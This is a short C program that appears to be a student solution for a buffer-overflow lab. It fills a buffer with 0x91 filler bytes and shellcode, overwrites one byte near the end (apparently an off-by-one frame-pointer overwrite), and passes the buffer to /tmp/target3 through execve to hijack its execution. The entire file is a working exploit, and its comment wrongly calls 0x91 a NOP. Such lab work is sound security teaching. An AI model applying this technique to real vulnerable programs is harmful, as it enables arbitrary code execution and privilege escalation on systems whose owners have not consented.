#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack_buffer[140];
  memset(attack_buffer, 0x91, 139);  // Fill with NOPs
  memcpy(attack_buffer, shellcode, strlen(shellcode));  // Copy the payload in

  attack_buffer[136] = 0x6c;

  args[0] = TARGET; args[1] = attack_buffer; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
